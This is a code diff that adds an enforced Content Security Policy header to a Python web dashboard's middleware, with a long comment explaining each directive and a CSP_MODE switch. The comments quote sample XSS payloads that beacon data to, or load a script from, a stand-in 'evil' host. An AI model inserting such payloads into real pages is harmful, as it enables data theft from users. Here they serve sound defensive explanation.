@@ -81,6 +81,124 @@ def _docs_enabled() -> bool:
     return (os.getenv("API_DOCS_ENABLED") or "").strip().lower() in ("1", "true", "yes", "on")
 
 
+# --- Content Security Policy --------------------------------------------------
+#
+# The comment that used to sit on the header below said a CSP was deliberately
+# not shipped because the dashboard relies on inline <script>/<style> blocks and
+# a strict policy would break the UI. That was true as far as it went, but it
+# treated "cannot be strict" as "cannot exist", and gave up everything a CSP does
+# that has nothing to do with inline script:
+#
+#   connect-src 'self'      an injected script cannot POST stolen data to an
+#                           attacker origin. Exfiltration is the entire point of
+#                           XSS, and this blocks the last step of it.
+#   img-src 'self' data: blob:
+#                           blocks <img src="//evil/?d=..."> beacons, which need
+#                           no script execution at all — and were the exact
+#                           channel this repo's own XSS tests use to prove an
+#                           injected node went live.
+#   script-src 'self'       blocks <script src="//evil/x.js"> even with
+#                           'unsafe-inline' allowed, so a payload cannot fetch a
+#                           second stage.
+#   object-src 'none'       no plugin/embed surface at all.
+#   base-uri 'self'         blocks <base href> injection, which would otherwise
+#                           silently rewrite every relative URL on the page —
+#                           including every API call this dashboard makes.
+#   form-action 'self'      blocks a form being retargeted to an attacker.
+#   frame-ancestors 'self'  clickjacking; the modern form of the X-Frame-Options
+#                           header set below, kept alongside it for old browsers.
+#
+# script-src carries NO 'unsafe-inline', which is the part that actually matters:
+# an injected inline payload cannot execute, so this policy prevents the injection
+# from starting rather than only limiting what a successful one can do. That is
+# only true because the last inline script in the frontend — one IIFE at the end
+# of login.html's <body> — was extracted to frontend/js/login.js. It sits in the
+# same position as a plain <script src>, so it parses and runs at the same point,
+# and tests/e2e loads login.html in jsdom with resources:'usable', which really
+# fetches and executes external scripts, so the extraction is covered rather than
+# assumed. If an inline script is ever added back, script-src must be loosened to
+# serve it — tests/test_content_security_policy.py fails instead, which is the
+# point: that trade should be a deliberate decision, not a silent regression.
+#
+# style-src DOES still carry 'unsafe-inline', and cannot drop it yet: there are
+# 43 style="..." attributes across index.html, login.html and six JS template
+# literals, and markup style attributes are governed by style-src. The residual
+# risk is much smaller than inline script — CSS cannot execute — and the main
+# exfiltration channel CSS does offer (background:url() to an attacker origin) is
+# already closed by img-src 'self' data: blob:. Replacing those 43 attributes with
+# classes would allow tightening it; that is a frontend refactor with no security
+# deadline attached.
+#
+# Every allowance was derived by enumerating what the frontend actually loads,
+# not guessed, and tests/test_content_security_policy.py re-runs that enumeration
+# so the policy and the frontend cannot drift apart silently:
+#
+#   fonts.googleapis.com    Google Fonts stylesheet, linked from index.html:8-10
+#   fonts.gstatic.com       and login.html:7-9; the font files themselves
+#   blob:                   autoApply.js:333 renders the review screenshot
+#                           through URL.createObjectURL when the session cookie
+#                           will not ride along on a cross-origin <img>
+#   data:                   allowed for inline SVG/CSS imagery; nothing uses it
+#                           today, and it costs nothing to permit
+#   'self' for connect-src  Caddy reverse-proxies the UI and the API on one
+#                           origin, and api.js baseUrl() returns
+#                           window.location.origin whenever the page was served
+#                           over http(s). The http://127.0.0.1:8000 fallback in
+#                           api.js only applies to a file:// page, which no
+#                           server delivers and which therefore carries no CSP.
+#
+# One caveat worth knowing: api.js also honours a `rja_api_base` localStorage
+# override for pointing the UI at a different API origin. An enforcing
+# connect-src 'self' blocks that. It is a development convenience, and the
+# documented deployments never need it; CSP_MODE=report-only is the way to check
+# before enforcing if you do rely on it.
+
+_CSP_DIRECTIVES = (
+    ("default-src", "'self'"),
+    ("script-src", "'self'"),
+    ("style-src", "'self' 'unsafe-inline' https://fonts.googleapis.com"),
+    ("font-src", "'self' https://fonts.gstatic.com"),
+    ("img-src", "'self' data: blob:"),
+    ("connect-src", "'self'"),
+    ("form-action", "'self'"),
+    ("frame-ancestors", "'self'"),
+    ("object-src", "'none'"),
+    ("base-uri", "'self'"),
+)
+
+CONTENT_SECURITY_POLICY = "; ".join(
+    f"{name} {value}" for name, value in _CSP_DIRECTIVES
+)
+
+
+def _csp_header_name() -> str:
+    """Which CSP header to send: enforcing, Report-Only, or "" for none.
+
+    `CSP_MODE=report-only` sends Content-Security-Policy-Report-Only, which the
+    browser evaluates and reports violations for WITHOUT blocking anything. That
+    is the correct way to check a policy against a real browser before enforcing
+    it, and it is the escape hatch if a policy that was verified here still
+    breaks something in a browser this sandbox cannot run.
+
+    `CSP_MODE=off` sends neither header. An escape hatch, not a recommendation:
+    it removes exfiltration and clickjacking protection along with the noise.
+    """
+    mode = (os.getenv("CSP_MODE") or "enforce").strip().lower()
+    if mode in ("off", "disabled", "none"):
+        return ""
+    if mode in ("report-only", "report_only", "reportonly"):
+        return "Content-Security-Policy-Report-Only"
+    if mode not in ("enforce", "on", "true", "1"):
+        warnings.warn(
+            f"CSP_MODE={mode!r} is not one of enforce/report-only/off; "
+            "enforcing the policy. An unrecognised mode failing open would be "
+            "worse than a typo being loud.",
+            RuntimeWarning,
+            stacklevel=2,
+        )
+    return "Content-Security-Policy"
+
+
 def _argv_host() -> str:
     """The host uvicorn was actually told to bind, from sys.argv, or "".
 
@@ -143,10 +261,11 @@ class _GateMiddleware(BaseHTTPMiddleware):
 
         response = await call_next(request)
 
-        # No Content-Security-Policy: the dashboard relies on inline
-        # <script>/<style> blocks (login.html included), so a strict CSP would
-        # break the UI. Shipping one means first extracting every inline block
-        # — deliberately not half-done here.
+        # See _CSP_DIRECTIVES for what this blocks, what it deliberately still
+        # allows ('unsafe-inline', and why), and how every allowance was derived.
+        csp_header = _csp_header_name()
+        if csp_header:
+            response.headers.setdefault(csp_header, CONTENT_SECURITY_POLICY)
         response.headers.setdefault("X-Content-Type-Options", "nosniff")
         response.headers.setdefault("X-Frame-Options", "SAMEORIGIN")
         response.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
